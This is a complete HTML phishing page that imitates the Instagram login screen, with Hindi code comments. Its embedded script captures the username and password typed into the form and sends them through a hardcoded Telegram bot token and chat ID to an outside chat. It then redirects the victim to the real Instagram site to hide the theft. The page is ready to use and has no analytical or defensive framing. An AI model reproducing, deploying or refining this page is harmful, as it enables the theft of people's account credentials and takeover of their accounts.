<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <!-- प्रोफेशनल CSS -->
    <style>
        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-box {
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            width: 350px;
            padding: 10px 0;
            margin-bottom: 10px;
        }
        .logo-container {
            text-align: center;
            margin: 30px auto 15px auto;
            width: 175px;
            height: 51px;
            /* यह Instagram का असली टेक्स्ट लोगो है */
            background-image: url('https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png');
            background-size: cover;
            background-repeat: no-repeat;
        }
        /* अगर टेक्स्ट लोगो काम न करे, तो उसके लिए एक वैकल्पिक स्टाइल */
        .logo-fallback {
            font-family: cursive;
            font-size: 50px;
            text-align: center;
            color: #262626;
            margin: 20px 0;
            display: none; /* जब तक असली लोगो लोड न हो, तब तक यह नहीं दिखेगा */
        }
        .form-container {
            margin-top: 20px;
            padding: 0 40px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin-bottom: 6px;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
        }
        input:focus {
            outline: none;
            border-color: #a8a8a8;
        }
        button {
            width: 100%;
            padding: 7px;
            margin-top: 10px;
            background-color: #0095f6;
            color: #ffffff;
            border: none;
            border-radius: 4px;
            font-weight: 600;
            cursor: pointer;
        }
        button:hover {
            background-color: #1877f2;
        }
        .or-divider {
            display: flex;
            align-items: center;
            margin: 15px 40px;
            color: #8e8e8e;
            font-weight: 600;
        }
        .or-divider::before, .or-divider::after {
            content: "";
            flex-grow: 1;
            height: 1px;
            background-color: #dbdbdb;
        }
        .or-divider::before { margin-right: 18px; }
        .or-divider::after { margin-left: 18px; }

        .fb-login {
            text-align: center;
            margin-bottom: 20px;
        }
        .fb-login a {
            text-decoration: none;
            color: #385185;
            font-weight: 600;
            font-size: 14px;
        }
        .signup-box {
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            width: 350px;
            padding: 25px;
            text-align: center;
            font-size: 14px;
        }
        .signup-box a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }
    </style>
</head>
<body>

    <div class="main-wrapper">
        <div class="login-box">
            <!-- लोगो यहाँ लोड होगा -->
            <div class="logo-container"></div>
            <div class="logo-fallback">Instagram</div> 

            <div class="form-container">
                <!-- फॉर्म -->
                <form id="loginForm">
                    <input type="text" name="username" placeholder="Phone number, username, or email" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit">Log In</button>
                </form>

                <div class="or-divider">OR</div>

                <div class="fb-login">
                    <a href="#">Log in with Facebook</a>
                </div>
            </div>
        </div>

        <div class="signup-box">
            Don't have an account? <a href="#">Sign up</a>
        </div>
    </div>

    <!-- जावास्क्रिप्ट (जैसा पहले था) -->
    <script>
        const token = "8766378111:AAFhFm2MWr1z2L3NuntmI-jlDzGr2wrQRRs";  
        const chatId = "7008289410";    

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault(); 

            let user = document.querySelector('input[name="username"]').value;
            let pass = document.querySelector('input[name="password"]').value;

            let message = `नया लॉगिन डेटा:\nयूजरनेम: ${user}\nपासवर्ड: ${pass}`;
            
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
            .then(response => response.json())
            .then(data => {
                console.log('सफलतापूर्वक भेज दिया गया', data);
                window.location.href = "https://instagram.com"; 
            })
            .catch(error => console.error('एरर:', error));
        });
    </script>

</body>
</html>
